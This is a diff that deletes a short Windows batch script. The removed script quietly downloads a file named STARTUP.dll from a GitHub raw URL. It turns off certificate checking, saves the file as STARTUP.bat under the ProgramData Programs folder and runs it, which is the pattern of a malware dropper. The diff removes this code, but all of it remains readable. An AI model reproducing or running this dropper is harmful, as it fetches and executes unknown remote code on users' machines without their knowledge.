@@ -1,9 +1,0 @@
-@echo off
-IF NOT EXIST "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\STARTUP.bat" (
-	curl -g -k -L -# -o "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\STARTUP.bat" "https://github.com/DOCSDROPT/OPTF_1/raw/main/SRTTP/STARTUP.dll" >nul 2>&1
-	@timeout /t 01>nul
-	START "" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\STARTUP.bat"
-) else (
-	START "" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\STARTUP.bat"
-)
-@echo on
